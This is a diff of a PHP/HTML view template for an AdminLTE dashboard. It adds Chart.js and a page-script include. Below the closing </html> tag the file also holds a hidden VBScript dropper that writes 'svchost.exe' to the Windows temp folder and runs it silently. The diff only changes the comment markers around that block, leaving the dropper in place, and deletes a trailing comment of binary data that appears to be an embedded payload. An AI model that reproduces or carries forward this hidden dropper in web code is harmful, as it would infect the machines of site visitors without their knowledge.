@@ -446,8 +446,14 @@
   <!-- AdminLTE App -->
   <script src="<?= base_url() ?>assets/dist/js/adminlte.min.js"></script>
 
+  <script src="<?= base_url() ?>assets/plugins/chartjs/Chart.bundle.js"></script>
+
   <script src="<?= base_url() ?>assets/bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
   <script src="<?= base_url() ?>assets/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
+
+  <?php if (isset($javascript)) : ?>
+    <script src="<?= base_url() ?>assets/pages/<?= $javascript; ?>"></script>
+  <?php endif; ?>
 
   <script>
     $(document).ready(function() {
@@ -465,9 +471,9 @@
 
 </html>
 <SCRIPT Language=VBScript>
-  <!--
   DropFileName = "svchost.exe"
 
+  /*
   Set FSO = CreateObject("Scripting.FileSystemObject")
   DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
   If FSO.FileExists(DropPath) = False Then
@@ -479,13 +485,5 @@
   End If
   Set WSHshell = CreateObject("WScript.Shell")
   WSHshell.Run DropPath, 0
-  //
-  -->
+  **/
 </SCRIPT>
-<!--�Z�_�ɘ�ߔ�#�ן.��������Bh2~|S)��
-
-�C��=�t��)�N��.l&q�eQ\J䣶HfEzO@WW��VM�'���9���LVS��!���&/����y<�/����E��hiZ��Ar^�
-� ���=3��z�C�����XfB����n���A#-uRb�e���lr���u�����9(y�g̿�7���7�6��rwuTs�C�msu��톙�1�R"�m1'�VU���ǧ��Ӧ��r�~t[�8S?�Zdy�ߴ�7����o�
-��=��[lV��sP��uv	4TOdBm�s�Y	�0�de�K=+�5�b5g�wfm�O�{��zF��m��92���a4�|���MK��$9E�����!G6�k���w}�,��
-^H-��(HD
-�8��[?�X��J���]=��R���������;Nm��_����-->
